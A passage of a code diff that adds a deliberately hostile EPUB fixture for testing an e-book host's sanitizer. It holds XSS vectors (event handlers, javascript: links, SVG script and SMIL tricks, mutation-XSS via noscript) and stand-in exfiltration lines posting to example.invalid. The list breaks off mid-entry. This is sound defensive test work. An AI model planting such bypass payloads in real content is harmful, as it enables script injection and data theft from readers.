@@ -711,4 +711,1029 @@ writeFileSync(
   ]),
 );
 
+// --- hostile fixture -------------------------------------------------------
+//
+// Every construct the sandboxed content host must neutralize, plus the benign
+// ones it must keep. Two rules make the fixture provable rather than merely
+// suggestive:
+//   * Remote references use the reserved .invalid TLD, so no test can ever
+//     reach a real host.
+//   * The attack sections deliberately omit properties="scripted". Sanitization
+//     is unconditional, and a fixture whose script all sat behind the declared
+//     property could not prove that. One control section declares it.
+// Every vector carries a distinct __pwned_* probe so one failure cannot mask
+// another, and hostile-vectors.json is checked against the emitted bytes below.
+
+const hostileScript = 'window.__pwned_external_script = 1;\n';
+
+const dataSvg = (probe) =>
+  'data:image/svg+xml;base64,' +
+  Buffer.from(
+    '<svg xmlns="http://www.w3.org/2000/svg"><script>window.' +
+      probe +
+      ' = 1;</script><circle id="p" r="4"/></svg>',
+    'utf-8',
+  ).toString('base64') +
+  '#p';
+
+const hostileAttacks = `<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Every Door at Once</title>
+<base href="https://example.invalid/base/"/>
+<meta http-equiv="refresh" content="0;url=https://example.invalid/redirect"/>
+<link rel="stylesheet" type="text/css" href="../styles/main.css"/>
+<script src="../scripts/pwn.js"></script>
+<script>window.__pwned_inline_script = 1;</script>
+</head>
+<body onload="window.__pwned_body_onload = 1">
+<h1>Every Door at Once</h1>
+<p>Nothing on this page is prose. Every line exists to be taken apart.</p>
+<p onclick="window.__pwned_onclick = 1">A paragraph that would run script on a click.</p>
+<p><span OnMouseOver = "window.__pwned_mixed_case = 1">Mixed case, and a space before the equals sign.</span></p>
+<p><a id="js-href" href="javascript:window.__pwned_js_href = 1">A scheme-carrying link.</a></p>
+<p><a id="entity-href" href="&#106;&#97;vascript:window.__pwned_entity_href = 1">The same scheme, spelled with character references.</a></p>
+<p><img id="onload-image" src="../images/dot.png" alt="dot" onload="window.__pwned_img_onload = 1"/></p>
+<p><img id="onerror-image" src="../images/broken.png" alt="broken" onerror="window.__pwned_img_onerror = 1"/></p>
+<form id="js-form" action="javascript:window.__pwned_form_action = 1"><input type="text" name="q" value="q"/><button type="submit">Run</button></form>
+<form id="remote-form" action="https://example.invalid/collect" method="post"><input type="hidden" name="leak" value="1"/></form>
+<iframe id="nested-frame" src="https://example.invalid/frame.html" width="10" height="10"></iframe>
+<object id="nested-object" data="https://example.invalid/thing.bin" type="application/octet-stream"><param name="src" value="https://example.invalid/thing.bin"/></object>
+<embed id="nested-embed" src="https://example.invalid/thing.svg" type="image/svg+xml"/>
+<template id="smuggled"><script>window.__pwned_template_script = 1;</script></template>
+<p>END_OF_ATTACKS</p>
+</body>
+</html>
+`;
+
+const hostileSvgAttacks = `<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>The Second Parser</title><link rel="stylesheet" type="text/css" href="../styles/main.css"/></head>
+<body>
+<h1>The Second Parser</h1>
+<p>Everything below is parsed in the SVG namespace, where an HTML-only allowlist has nothing to say.</p>
+<svg id="hostile-svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="240" height="170" onload="window.__pwned_svg_onload = 1">
+<title>An invented diagram</title>
+<script>window.__pwned_svg_script = 1;</script>
+<rect x="4" y="4" width="40" height="40" fill="#2b5588">
+<set attributeName="onmouseover" to="window.__pwned_smil_set = 1" begin="0s"/>
+<animate attributeName="opacity" values="1;1" begin="0s" dur="1s" onbegin="window.__pwned_smil_onbegin = 1"/>
+</rect>
+<use id="use-href" href="${dataSvg('__pwned_svg_use_href')}"/>
+<use id="use-xlink" xlink:href="${dataSvg('__pwned_svg_use_xlink')}"/>
+<foreignObject x="60" y="4" width="170" height="44">
+<body xmlns="http://www.w3.org/1999/xhtml"><script>window.__pwned_foreign_object = 1;</script><p>Foreign HTML inside SVG.</p></body>
+</foreignObject>
+<a id="smil-link" href="#hostile-svg"><text x="4" y="110">An animated link</text>
+<animate attributeName="href" to="javascript:window.__pwned_smil_animate = 1" begin="0s" dur="2s" fill="freeze"/>
+</a>
+<a id="xlink-anchor" xlink:href="javascript:window.__pwned_svg_xlink = 1"><text x="4" y="140">A namespaced link</text></a>
+</svg>
+<p>END_OF_SVG_ATTACKS</p>
+</body>
+</html>
+`;
+
+const hostileSvgDocument = `<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="240" height="90" onload="window.__pwned_svg_doc_onload = 1">
+<title>A Plate That Bites</title>
+<script>window.__pwned_svg_document = 1;</script>
+<rect x="2" y="2" width="236" height="86" fill="#eef2f6"/>
+<text x="12" y="50">A spine item that is itself an SVG document.</text>
+</svg>
+`;
+
+// Deliberately not well-formed XML: unclosed elements, an unescaped ampersand
+// and unquoted attribute values. Real books ship all three, so the host's
+// text/html fallback path is what renders this section.
+const hostileMalformed = `<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>Books Are Not Well Formed</title></head>
+<body>
+<h1>Books Are Not Well Formed</h1>
+<p>This paragraph is never closed, which is how the XHTML parse fails and the HTML parse takes over.
+<p>The ledgers of Smith & Sons were kept in two hands, and neither hand agreed with the other.</p>
+<scr<script>ipt>window.__pwned_nested_script = 1;</scr</script>ipt>
+<img src=../images/broken.png onerror=window.__pwned_unquoted_attr=1 alt=U>
+<noscript><p title="</noscript><img src=x onerror=window.__pwned_mxss_noscript=1>"></noscript>
+<ul>
+<li>First item, unclosed
+<li>Second item, unclosed
+</ul>
+<p>MALFORMED_TAIL_SENTINEL. This paragraph follows an unclosed paragraph, an unclosed list and a nested tag, and must still be readable.</p>
+</body>
+</html>
+`;
+
+const hostilePreserve = `<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>What Must Survive</title><link rel="stylesheet" type="text/css" href="../styles/main.css"/></head>
+<body>
+<h1 id="preserve-heading">What Must Survive</h1>
+<p class="first"><img class="dropcap" src="../images/dropcap-t.png" alt="T"/>he lamplighter counted the same forty steps every evening, and on the fortieth he looked up.</p>
+<span class="x-ebookmaker-pageno"><a id="page_357"></a></span>
+<p>One zero-width page anchor sits above this paragraph and another sits <span class="x-ebookmaker-pageno"><a id="page_358"></a></span> inside this sentence. Both are what fragment navigation resolves against.</p>
+<a id="chapter-mark"/>
+<h2>After the self-closing anchor</h2>
+<p>SENTINEL_AFTER_SELF_CLOSING_ANCHOR. An HTML parser ignores the slash on a self-closing anchor, so a careless re-serialization lets the anchor swallow every line below it.</p>
+<p>The harbour master kept <em>two</em> ledgers and <strong>never</strong> the same one twice.</p>
+<ul>
+<li>Salt, in barrels.</li>
+<li>Rope, in coils.</li>
+<li>Lamp oil, in cans.</li>
+</ul>
+<blockquote><p>We are paid to remember what the tide forgets.</p></blockquote>
+<table>
+<thead><tr><th>Ledger</th><th>Entries</th></tr></thead>
+<tbody><tr><td>Morning</td><td>41</td></tr><tr><td>Evening</td><td>40</td></tr></tbody>
+</table>
+<p><a href="#page_357">Back to page 357</a></p>
+<p>TAIL_SENTINEL_PRESERVE. If this line is missing, the self-closing anchor swallowed the rest of the section.</p>
+</body>
+</html>
+`;
+
+const hostileResources = `<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Everything It Must Load</title>
+<link id="local-stylesheet" rel="stylesheet" type="text/css" href="../styles/main.css"/>
+<link id="cycle-stylesheet" rel="stylesheet" type="text/css" href="../styles/cycle-a.css"/>
+<link id="remote-stylesheet" rel="stylesheet" type="text/css" href="https://example.invalid/remote.css"/>
+</head>
+<body>
+<h1>Everything It Must Load</h1>
+<p><img id="local-image" src="../images/dot.png" alt="A single dot"/> An image from inside the archive.</p>
+<p><img id="remote-image" src="https://example.invalid/pixel.png" alt="A tracking pixel"/> An image from outside it.</p>
+<p><img id="declared-missing-image" src="../images/declared-missing.png" alt="D"/>eclared in the manifest, absent from the archive.</p>
+<p><img id="undeclared-image" src="../images/undeclared-present.png" alt="U"/>ndeclared in the manifest, present in the archive.</p>
+<div id="inline-style-url" style="background-image: url(../images/dot.png); width: 24px; height: 24px;">.</div>
+<div id="css-url-image" class="plate">.</div>
+<p id="css-remote-background" class="leak">A stylesheet-only exfiltration channel.</p>
+<p id="font-face-text" class="stub-face">Text set in the stub face.</p>
+<p>END_OF_RESOURCES</p>
+</body>
+</html>
+`;
+
+const hostileScriptedDeclared = `<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>Declared Scripted</title></head>
+<body>
+<h1>Declared Scripted</h1>
+<p>This is the only section whose manifest item declares the scripted property. The rendering path must be identical to the sections that carry script without declaring it.</p>
+<script>window.__pwned_declared_scripted = 1;</script>
+<p>END_OF_SCRIPTED_DECLARED</p>
+</body>
+</html>
+`;
+
+// url("second.css") and url("assets/plate.png") are relative to this stylesheet,
+// not to the section that links it. The two directories are siblings, so a host
+// that resolves them against the section instead lands nowhere - which is the
+// point of writing them in the form real books use.
+const hostileMainCss = `@import url("second.css");
+@import url(https://example.invalid/x.css);
+@font-face { font-family: "Hostile Stub"; src: url("../fonts/stub.woff") format("woff"); }
+body { font-family: serif; margin: 1em; }
+h1 { font-size: 1.4em; }
+.dropcap { float: left; font-size: 3em; line-height: 0.8; padding-right: 0.1em; }
+.x-ebookmaker-pageno { font-size: 0; }
+.leak { background-image: url(https://example.invalid/?leak=css); }
+.stub-face { font-family: "Hostile Stub", serif; }
+`;
+
+const hostileSecondCss = `.plate { background-image: url("assets/plate.png"); width: 24px; height: 24px; }
+`;
+
+const hostileCycleACss = `@import url("cycle-b.css");
+.cycle-a { color: #123456; }
+`;
+
+const hostileCycleBCss = `@import url("cycle-a.css");
+.cycle-b { color: #654321; }
+`;
+
+const hostileNav = `<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
+<head><title>A Hostile Little Book</title></head>
+<body>
+<nav epub:type="toc">
+<h1>Contents</h1>
+<ol>
+<li><a href="text/attacks.xhtml">Every Door at Once</a></li>
+<li><a href="text/svg-attacks.xhtml">The Second Parser</a></li>
+<li><a href="text/hostile.svg">A Plate That Bites</a></li>
+<li><a href="text/malformed.xhtml">Books Are Not Well Formed</a></li>
+<li><a href="text/preserve.xhtml">What Must Survive</a></li>
+<li><a href="text/resources.xhtml">Everything It Must Load</a></li>
+<li><a href="text/scripted-declared.xhtml">Declared Scripted</a></li>
+</ol>
+</nav>
+</body>
+</html>
+`;
+
+const hostileOpf = `<?xml version="1.0" encoding="UTF-8"?>
+<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid" xml:lang="en">
+  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
+    <dc:identifier id="uid">urn:uuid:5e7c1f20-9a3d-4b8e-8c11-6d4f2a0b7e33</dc:identifier>
+    <dc:title>A Hostile Little Book</dc:title>
+    <dc:creator>Nobody At All</dc:creator>
+    <dc:language>en</dc:language>
+    <meta property="dcterms:modified">2026-08-24T00:00:00Z</meta>
+  </metadata>
+  <manifest>
+    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
+    <item id="attacks" href="text/attacks.xhtml" media-type="application/xhtml+xml"/>
+    <item id="svg-attacks" href="text/svg-attacks.xhtml" media-type="application/xhtml+xml"/>
+    <item id="svg-document" href="text/hostile.svg" media-type="image/svg+xml"/>
+    <item id="malformed" href="text/malformed.xhtml" media-type="application/xhtml+xml"/>
+    <item id="preserve" href="text/preserve.xhtml" media-type="application/xhtml+xml"/>
+    <item id="resources" href="text/resources.xhtml" media-type="application/xhtml+xml"/>
+    <item id="scripted-declared" href="text/scripted-declared.xhtml" media-type="application/xhtml+xml" properties="scripted"/>
+    <item id="style-main" href="styles/main.css" media-type="text/css"/>
+    <item id="style-second" href="styles/second.css" media-type="text/css"/>
+    <item id="style-cycle-a" href="styles/cycle-a.css" media-type="text/css"/>
+    <item id="style-cycle-b" href="styles/cycle-b.css" media-type="text/css"/>
+    <item id="image-dot" href="images/dot.png" media-type="image/png"/>
+    <item id="image-broken" href="images/broken.png" media-type="image/png"/>
+    <item id="image-dropcap" href="images/dropcap-t.png" media-type="image/png"/>
+    <item id="image-declared-missing" href="images/declared-missing.png" media-type="image/png"/>
+    <item id="image-plate" href="styles/assets/plate.png" media-type="image/png"/>
+    <item id="font-stub" href="fonts/stub.woff" media-type="font/woff"/>
+    <item id="script-pwn" href="scripts/pwn.js" media-type="text/javascript"/>
+  </manifest>
+  <spine>
+    <itemref idref="attacks"/>
+    <itemref idref="svg-attacks"/>
+    <itemref idref="svg-document"/>
+    <itemref idref="malformed"/>
+    <itemref idref="preserve"/>
+    <itemref idref="resources"/>
+    <itemref idref="scripted-declared"/>
+  </spine>
+</package>
+`;
+
+const stubWoff = Buffer.concat([
+  Buffer.from([0x77, 0x4f, 0x46, 0x46, 0x00, 0x01, 0x00, 0x00]),
+  Buffer.from('stub woff payload: the reference must rewrite, the face will not render\n', 'latin1'),
+]);
+
+const hostileEntries = [
+  mimetypeEntry,
+  { name: 'META-INF/container.xml', data: containerXml('OEBPS/content.opf') },
+  { name: 'OEBPS/content.opf', data: hostileOpf },
+  { name: 'OEBPS/nav.xhtml', data: hostileNav },
+  { name: 'OEBPS/text/attacks.xhtml', data: hostileAttacks },
+  { name: 'OEBPS/text/svg-attacks.xhtml', data: hostileSvgAttacks },
+  { name: 'OEBPS/text/hostile.svg', data: hostileSvgDocument },
+  { name: 'OEBPS/text/malformed.xhtml', data: hostileMalformed },
+  { name: 'OEBPS/text/preserve.xhtml', data: hostilePreserve },
+  { name: 'OEBPS/text/resources.xhtml', data: hostileResources },
+  { name: 'OEBPS/text/scripted-declared.xhtml', data: hostileScriptedDeclared },
+  { name: 'OEBPS/styles/main.css', data: hostileMainCss },
+  { name: 'OEBPS/styles/second.css', data: hostileSecondCss },
+  { name: 'OEBPS/styles/cycle-a.css', data: hostileCycleACss },
+  { name: 'OEBPS/styles/cycle-b.css', data: hostileCycleBCss },
+  { name: 'OEBPS/styles/assets/plate.png', data: makePng(90, 40, 120), method: 0 },
+  { name: 'OEBPS/images/dot.png', data: makePng(30, 90, 160), method: 0 },
+  { name: 'OEBPS/images/broken.png', data: 'not a PNG, on purpose\n' },
+  { name: 'OEBPS/images/undeclared-present.png', data: makePng(200, 190, 20), method: 0 },
+  { name: 'OEBPS/fonts/stub.woff', data: stubWoff, method: 0 },
+  { name: 'OEBPS/scripts/pwn.js', data: hostileScript },
+];
+
+const ATTACKS = 'OEBPS/text/attacks.xhtml';
+const SVG_ATTACKS = 'OEBPS/text/svg-attacks.xhtml';
+const SVG_DOC = 'OEBPS/text/hostile.svg';
+const MALFORMED = 'OEBPS/text/malformed.xhtml';
+const PRESERVE = 'OEBPS/text/preserve.xhtml';
+const RESOURCES = 'OEBPS/text/resources.xhtml';
+const SCRIPTED = 'OEBPS/text/scripted-declared.xhtml';
+const MAIN_CSS = 'OEBPS/styles/main.css';
+const SECOND_CSS = 'OEBPS/styles/second.css';
+const CYCLE_A_CSS = 'OEBPS/styles/cycle-a.css';
+const CYCLE_B_CSS = 'OEBPS/styles/cycle-b.css';
+
+function vector({ id, sectionId, source, expectation, probe, selector, description, snippet, note }) {
+  return {
+    id,
+    sectionId,
+    source,
+    expectation,
+    ...(probe === undefined ? {} : { probe }),
+    ...(selector === undefined ? {} : { selector }),
+    description,
+    snippet,
+    ...(note === undefined ? {} : { note }),
+  };
+}
+
+const hostileVectors = [
+  vector({
+    id: 'base-element',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    selector: 'base',
+    description: 'A <base> in the head that would re-point every relative reference at a remote origin.',
+    snippet: '<base href="https://example.invalid/base/"/>',
+  }),
+  vector({
+    id: 'meta-refresh',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    selector: 'meta[http-equiv]',
+    description: 'A meta refresh that navigates the frame without script.',
+    snippet: '<meta http-equiv="refresh" content="0;url=https://example.invalid/redirect"/>',
+  }),
+  vector({
+    id: 'external-script',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_external_script',
+    selector: 'script[src]',
+    description: 'A <script src> pointing at a JavaScript file that really is in the archive and really is in the manifest, so resolve() would happily hand back bytes for it.',
+    snippet: '<script src="../scripts/pwn.js"></script>',
+  }),
+  vector({
+    id: 'inline-script',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_inline_script',
+    selector: 'script',
+    description: 'An inline <script> in the head.',
+    snippet: '<script>window.__pwned_inline_script = 1;</script>',
+  }),
+  vector({
+    id: 'body-onload',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_body_onload',
+    description: 'An on* handler on <body> itself - the attribute a host that copies body attributes across would carry into its own document.',
+    snippet: '<body onload="window.__pwned_body_onload = 1">',
+  }),
+  vector({
+    id: 'onclick-handler',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_onclick',
+    description: 'An onclick handler on a paragraph.',
+    snippet: '<p onclick="window.__pwned_onclick = 1">',
+  }),
+  vector({
+    id: 'mixed-case-handler',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_mixed_case',
+    description: 'An on* handler written OnMouseOver with whitespace before the equals sign. XML preserves attribute case, so a sanitizer testing name.startsWith("on") misses it - and the name lowercases into a live handler the moment the tree is adopted into an HTML document.',
+    snippet: '<span OnMouseOver = "window.__pwned_mixed_case = 1">',
+  }),
+  vector({
+    id: 'javascript-href',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'inert',
+    probe: '__pwned_js_href',
+    selector: '#js-href',
+    description: 'A javascript: URL in an href. The anchor may survive; activating it must navigate nowhere and execute nothing.',
+    snippet: '<a id="js-href" href="javascript:window.__pwned_js_href = 1">',
+  }),
+  vector({
+    id: 'entity-encoded-javascript-href',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'inert',
+    probe: '__pwned_entity_href',
+    selector: '#entity-href',
+    description: 'The same scheme spelled with numeric character references, which the parser decodes before any attribute-value check sees it.',
+    snippet: '<a id="entity-href" href="&#106;&#97;vascript:window.__pwned_entity_href = 1">',
+  }),
+  vector({
+    id: 'img-onload',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_img_onload',
+    selector: '#onload-image',
+    description: 'An onload handler on an image whose source really does resolve and really does load, so the handler fires with no user action if it survives.',
+    snippet: '<img id="onload-image" src="../images/dot.png" alt="dot" onload="window.__pwned_img_onload = 1"/>',
+  }),
+  vector({
+    id: 'img-onerror',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_img_onerror',
+    selector: '#onerror-image',
+    description: 'An onerror handler on an image declared image/png whose bytes are not a PNG. It resolves, a blob: URL is built, decoding fails, and the handler fires - the classic that needs no user action.',
+    snippet: '<img id="onerror-image" src="../images/broken.png" alt="broken" onerror="window.__pwned_img_onerror = 1"/>',
+  }),
+  vector({
+    id: 'form-javascript-action',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_form_action',
+    selector: '#js-form',
+    description: 'A form whose action is a javascript: URL.',
+    snippet: '<form id="js-form" action="javascript:window.__pwned_form_action = 1">',
+  }),
+  vector({
+    id: 'form-remote-action',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    selector: '#remote-form',
+    description: 'A form that would POST to a remote origin. The sandbox withholds allow-forms, but the element must not survive either.',
+    snippet: '<form id="remote-form" action="https://example.invalid/collect" method="post">',
+  }),
+  vector({
+    id: 'iframe-element',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    selector: '#nested-frame',
+    description: 'A nested iframe pointing at a remote document.',
+    snippet: '<iframe id="nested-frame" src="https://example.invalid/frame.html" width="10" height="10"></iframe>',
+  }),
+  vector({
+    id: 'object-element',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    selector: '#nested-object',
+    description: 'An <object> with a remote data reference and a <param>.',
+    snippet: '<object id="nested-object" data="https://example.invalid/thing.bin" type="application/octet-stream"><param name="src" value="https://example.invalid/thing.bin"/></object>',
+  }),
+  vector({
+    id: 'embed-element',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    selector: '#nested-embed',
+    description: 'An <embed> with a remote source.',
+    snippet: '<embed id="nested-embed" src="https://example.invalid/thing.svg" type="image/svg+xml"/>',
+  }),
+
+  vector({
+    id: 'template-smuggled-script',
+    sectionId: 'attacks',
+    source: ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_template_script',
+    selector: '#smuggled',
+    description: 'A script inside a <template>. An HTML parse puts it in the template content fragment, which a sanitizer walking element.children never visits, and a serialize-and-reparse hands it straight back.',
+    snippet: '<template id="smuggled"><script>window.__pwned_template_script = 1;</script></template>',
+    note: 'Inert until something clones the template content, so the assertion is that neither the element nor the script survives - an allowlist that has no entry for <template> gets this for free.',
+  }),
+
+  vector({
+    id: 'svg-root-onload',
+    sectionId: 'svg-attacks',
+    source: SVG_ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_svg_onload',
+    selector: '#hostile-svg',
+    description: 'An onload handler on the <svg> root, which fires on its own.',
+    snippet: 'onload="window.__pwned_svg_onload = 1"',
+  }),
+  vector({
+    id: 'svg-script',
+    sectionId: 'svg-attacks',
+    source: SVG_ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_svg_script',
+    description: 'A <script> in the SVG namespace, which an HTML-only element allowlist never sees.',
+    snippet: '<script>window.__pwned_svg_script = 1;</script>',
+  }),
+  vector({
+    id: 'svg-smil-set-handler',
+    sectionId: 'svg-attacks',
+    source: SVG_ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_smil_set',
+    description: 'A SMIL <set> that writes an event-handler attribute onto its parent after sanitization has already run over the attributes.',
+    snippet: '<set attributeName="onmouseover" to="window.__pwned_smil_set = 1" begin="0s"/>',
+  }),
+  vector({
+    id: 'svg-animate-onbegin',
+    sectionId: 'svg-attacks',
+    source: SVG_ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_smil_onbegin',
+    description: 'An onbegin handler on a SMIL <animate>, which fires by itself when the animation starts.',
+    snippet: '<animate attributeName="opacity" values="1;1" begin="0s" dur="1s" onbegin="window.__pwned_smil_onbegin = 1"/>',
+  }),
+  vector({
+    id: 'svg-use-data-href',
+    sectionId: 'svg-attacks',
+    source: SVG_ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_svg_use_href',
+    selector: '#use-href',
+    description: 'A <use> whose href is a data: SVG carrying a script.',
+    snippet: '<use id="use-href" href="' + dataSvg('__pwned_svg_use_href') + '"/>',
+  }),
+  vector({
+    id: 'svg-use-data-xlink-href',
+    sectionId: 'svg-attacks',
+    source: SVG_ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_svg_use_xlink',
+    selector: '#use-xlink',
+    description: 'The same vector spelled with the legacy xlink:href attribute, which a sanitizer that only knows the unprefixed name will leave in place.',
+    snippet: '<use id="use-xlink" xlink:href="' + dataSvg('__pwned_svg_use_xlink') + '"/>',
+  }),
+  vector({
+    id: 'svg-foreign-object-script',
+    sectionId: 'svg-attacks',
+    source: SVG_ATTACKS,
+    expectation: 'removed',
+    description: 'A <foreignObject> that re-enters the XHTML namespace and carries a script there.',
+    probe: '__pwned_foreign_object',
+    snippet: '<foreignObject x="60" y="4" width="170" height="44">\n<body xmlns="http://www.w3.org/1999/xhtml"><script>window.__pwned_foreign_object = 1;</script><p>Foreign HTML inside SVG.</p></body>',
+  }),
+  vector({
+    id: 'svg-smil-animate-href',
+    sectionId: 'svg-attacks',
+    source: SVG_ATTACKS,
+    expectation: 'removed',
+    probe: '__pwned_smil_animate',
+    description: 'A SMIL <animate> that rewrites an anchor href to a javascript: URL after the fact.',
+    snippet: '<animate attributeName="href" to="javascript:window.__pwned_smil_animate = 1" begin="0s" dur="2s" fill="freeze"/>',
+  }),
+  vector({
+    id: 'svg-xlink-javascript-href',
+    sectionId: 'svg-attacks',
+    source: SVG_ATTACKS,
+    expectation: 'inert',
+    probe: '__pwned_svg_xlink',
+    selector: '#xlink-anchor',
+    description: 'An SVG anchor whose javascript: URL sits in xlink:href rather than href.',
+    snippet: '<a id="xlink-anchor" xlink:href="javascript:window.__pwned_svg_xlink = 1">',
+  }),
+
+  vector({
+    id: 'svg-document-script',
+    sectionId: 'svg-document',
+    source: SVG_DOC,
+    expectation: 'removed',
+    probe: '__pwned_svg_document',
+    description: 'A script in a spine item that is itself an image/svg+xml document, so the whole section - not an embedded fragment - is parsed in the SVG namespace.',
+    snippet: '<script>window.__pwned_svg_document = 1;</script>',
+  }),
+  vector({
+    id: 'svg-document-onload',
+    sectionId: 'svg-document',
+    source: SVG_DOC,
+    expectation: 'removed',
+    probe: '__pwned_svg_doc_onload',
+    description: 'An onload handler on the root element of that SVG spine item.',
+    snippet: 'onload="window.__pwned_svg_doc_onload = 1"',
+  }),
+
+  vector({
+    id: 'nested-script-tag',
+    sectionId: 'malformed',
+    source: MALFORMED,
+    expectation: 'removed',
+    probe: '__pwned_nested_script',
+    description: 'The classic nested-tag construct aimed at regex sanitizers: stripping the inner <script> leaves a working one behind.',
+    snippet: '<scr<script>ipt>window.__pwned_nested_script = 1;</scr</script>ipt>',
+    note: 'Inert by construction under a real HTML parser, which tokenizes this into an unknown element named scr<script rather than a script. It is here to pin that the host parses instead of pattern-matching; an allowlist must drop the unknown element regardless.',
+  }),
+  vector({
+    id: 'unquoted-onerror',
+    sectionId: 'malformed',
+    source: MALFORMED,
+    expectation: 'removed',
+    probe: '__pwned_unquoted_attr',
+    description: 'Unquoted attribute values, including an onerror on an image whose bytes are not a PNG. Illegal in XML, ordinary in HTML, and live once the fallback parser accepts it.',
+    snippet: '<img src=../images/broken.png onerror=window.__pwned_unquoted_attr=1 alt=U>',
+  }),
+  vector({
+    id: 'mxss-noscript-reparse',
+    sectionId: 'malformed',
+    source: MALFORMED,
+    expectation: 'removed',
+    probe: '__pwned_mxss_noscript',
+    description: 'Mutation XSS: with scripting enabled the <noscript> body is raw text, so the img sits harmlessly inside a title attribute. Serialize that tree and parse it again in a context where noscript is parsed as markup, and the attribute boundary moves - the img escapes and its onerror is live. The exact shape a parse-sanitize-serialize-into-srcdoc pipeline has to survive.',
+    snippet: '<noscript><p title="</noscript><img src=x onerror=window.__pwned_mxss_noscript=1>"></noscript>',
+  }),
+  vector({
+    id: 'unescaped-ampersand',
+    sectionId: 'malformed',
+    source: MALFORMED,
+    expectation: 'preserved',
+    description: 'A bare ampersand in text. The XHTML parse must fail and the HTML fallback must render the words, ampersand included.',
+    snippet: 'The ledgers of Smith & Sons were kept in two hands',
+  }),
+  vector({
+    id: 'unclosed-paragraph-tail',
+    sectionId: 'malformed',
+    source: MALFORMED,
+    expectation: 'preserved',
+    description: 'Content after an unclosed paragraph. MALFORMED_TAIL_SENTINEL must appear in the rendered text.',
+    snippet: '<p>MALFORMED_TAIL_SENTINEL.',
+  }),
+  vector({
+    id: 'unclosed-list-items',
+    sectionId: 'malformed',
+    source: MALFORMED,
+    expectation: 'preserved',
+    description: 'Two unclosed list items must render as two list items, not one.',
+    snippet: '<li>First item, unclosed\n<li>Second item, unclosed',
+  }),
+
+  vector({
+    id: 'pageno-anchor-span',
+    sectionId: 'preserve',
+    source: PRESERVE,
+    expectation: 'preserved',
+    selector: '#page_357',
+    description: 'A zero-width page anchor at block level. Sanitizing is not tidying: this is what fragment navigation, and later reading positions, resolve against.',
+    snippet: '<span class="x-ebookmaker-pageno"><a id="page_357"></a></span>',
+  }),
+  vector({
+    id: 'pageno-anchor-span-inline',
+    sectionId: 'preserve',
+    source: PRESERVE,
+    expectation: 'preserved',
+    selector: '#page_358',
+    description: 'The same construct mid-sentence, where an empty-inline cleanup pass is most tempting.',
+    snippet: '<span class="x-ebookmaker-pageno"><a id="page_358"></a></span>',
+  }),
+  vector({
+    id: 'pageno-span-styling',
+    sectionId: 'preserve',
+    source: MAIN_CSS,
+    expectation: 'preserved',
+    description: 'The publisher rule that makes those page anchors zero-width. It is why they are invisible and why a tidying pass is tempted to drop them.',
+    snippet: '.x-ebookmaker-pageno { font-size: 0; }',
+  }),
+  vector({
+    id: 'self-closing-anchor',
+    sectionId: 'preserve',
+    source: PRESERVE,
+    expectation: 'preserved',
+    selector: '#chapter-mark',
+    description: 'An XHTML self-closing non-void tag. It must come out as an empty <a id="chapter-mark"></a>.',
+    snippet: '<a id="chapter-mark"/>',
+  }),
+  vector({
+    id: 'self-closing-anchor-tail',
+    sectionId: 'preserve',
+    source: PRESERVE,
+    expectation: 'preserved',
+    description: 'Everything after that anchor. An HTML parser ignores the slash, so a re-serialization that goes through raw markup lets the anchor swallow the remainder; SENTINEL_AFTER_SELF_CLOSING_ANCHOR and TAIL_SENTINEL_PRESERVE must both survive, and neither may end up inside the anchor.',
+    snippet: '<p>TAIL_SENTINEL_PRESERVE.',
+  }),
+  vector({
+    id: 'dropcap-alt-substitution',
+    sectionId: 'preserve',
+    source: PRESERVE,
+    expectation: 'preserved',
+    description: 'A drop-cap image declared in the manifest but absent from the archive, so resolve() returns undefined. The alt text must be substituted back as a text node - dropping the image silently deletes the first letter of the chapter, which must read "The lamplighter".',
+    snippet: '<img class="dropcap" src="../images/dropcap-t.png" alt="T"/>',
+  }),
+  vector({
